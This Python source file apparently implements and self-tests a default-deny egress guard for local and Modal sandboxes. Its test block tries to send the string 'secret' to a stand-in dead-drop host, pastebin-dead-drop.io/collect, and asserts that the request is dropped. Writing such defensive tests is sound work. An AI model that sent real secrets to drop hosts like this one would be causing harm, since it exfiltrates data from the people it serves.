import os
from dataclasses import dataclass, field
from typing import Protocol

from gateway.egress import Profile, child_inherits, default_deny_guard, resolve_allowlist


@dataclass(frozen=True)
class EgressResult:
    outcome: str
    dest: str
    denied_row: dict | None


@dataclass(frozen=True)
class EgressPolicy:
    floor: frozenset[str]
    session_extra: frozenset[str] = frozenset()
    run_id: str = "incident"

    def chain(self) -> list[Profile]:
        floor_p = Profile("enterprise", self.floor)
        session_p = Profile("session", self.floor | self.session_extra)
        return child_inherits([floor_p], session_p)


class Sandbox(Protocol):
    def egress(self, principal: str, dest: str, body: str) -> EgressResult: ...
    def close(self) -> None: ...


def _host(dest: str) -> str:
    d = dest.split("://", 1)[-1].split("/", 1)[0]
    return d.rsplit("@", 1)[-1].split(":", 1)[0]


@dataclass
class LocalSandbox:
    policy: EgressPolicy
    backend: str = "local"
    sent: list = field(default_factory=list)
    sandbox_ids: list = field(default_factory=list)
    receipts: list = field(default_factory=list)

    def egress(self, principal: str, dest: str, body: str) -> EgressResult:
        decision, row = default_deny_guard(self.policy.run_id, principal, self.policy.chain(), dest)
        outcome = "SENT" if decision.allow else "DROPPED"
        self.receipts.append({"host": _host(dest), "exit_code": None, "outcome": outcome, "external": False})
        if not decision.allow:
            return EgressResult("DROPPED", dest, row)
        self.sent.append((dest, body))
        return EgressResult("SENT", dest, None)

    def close(self) -> None: ...


_CURL_SNIPPET = (
    "import sys, urllib.request, urllib.error\n"
    "dest, body = sys.argv[1], sys.argv[2]\n"
    "url = dest if '://' in dest else 'https://' + dest\n"
    "try:\n"
    "    urllib.request.urlopen(urllib.request.Request(url, data=body.encode()), timeout=5).read()\n"
    "except urllib.error.HTTPError:\n"
    "    pass\n"
)


@dataclass
class ModalSandbox:
    policy: EgressPolicy
    backend: str = "modal"
    _app: object = None
    _sb: object = None
    _allow: frozenset = frozenset()
    sent: list = field(default_factory=list)
    sandbox_ids: list = field(default_factory=list)
    receipts: list = field(default_factory=list)

    def _ensure(self):
        if self._sb is not None:
            return
        import ipaddress
        import modal
        self._allow = frozenset(resolve_allowlist(self.policy.chain()))
        self._app = modal.App.lookup("incident-egress", create_if_missing=True)
        img = modal.Image.debian_slim()
        cidrs, domains = [], []
        for a in sorted(self._allow):
            try:
                ipaddress.ip_network(a, strict=False)
                cidrs.append(a)
            except ValueError:
                domains.append(a)
        kw = {}
        if cidrs:
            kw["outbound_cidr_allowlist"] = cidrs
        if domains:
            kw["outbound_domain_allowlist"] = domains
        if not kw:
            kw["block_network"] = True
        self._sb = modal.Sandbox.create(app=self._app, image=img, **kw)
        self.sandbox_ids.append(self._sb.object_id)

    def egress(self, principal: str, dest: str, body: str) -> EgressResult:
        decision, row = default_deny_guard(self.policy.run_id, principal, self.policy.chain(), dest)
        self._ensure()
        proc = self._sb.exec("python3", "-c", _CURL_SNIPPET, dest, body)
        rc = proc.wait()
        self.receipts.append({"host": _host(dest), "exit_code": rc,
                              "outcome": "DROPPED" if rc != 0 else "SENT", "external": True})
        if rc != 0:
            assert not decision.allow, "VM dropped a host the policy allowed — parity broken"
            return EgressResult("DROPPED", dest, row)
        assert decision.allow, "VM sent to a host the policy denied — VM enforcement is fake"
        self.sent.append((dest, body))
        return EgressResult("SENT", dest, None)

    def exec_python(self, source: str, *args) -> tuple[int, str]:
        self._ensure()
        proc = self._sb.exec("python3", "-c", source, *args)
        rc = proc.wait()
        return rc, proc.stdout.read()

    def close(self) -> None:
        if self._sb is not None:
            self._sb.terminate()


def modal_available() -> bool:
    try:
        import modal
    except ImportError:
        return False
    if os.environ.get("MODAL_TOKEN_ID"):
        return True
    return _active_profile_has_token()


def _active_profile_has_token() -> bool:
    path = os.path.expanduser("~/.modal.toml")
    if not os.path.exists(path):
        return False
    import tomllib
    with open(path, "rb") as f:
        cfg = tomllib.load(f)
    return any(p.get("active") and p.get("token_id") for p in cfg.values())


if __name__ == "__main__":
    pol = EgressPolicy(floor=frozenset({"api.corp.com"}), session_extra=frozenset({"pastebin-dead-drop.io"}))
    sb = LocalSandbox(pol)
    assert sb.egress("session", "https://api.corp.com/x", "hi").outcome == "SENT"
    r = sb.egress("session", "https://pastebin-dead-drop.io/collect", "secret")
    assert r.outcome == "DROPPED" and r.denied_row["reason_code"] == "egress_default_deny"
    assert r.denied_row["guardrail"] == "sandbox_egress"
    print("ok")
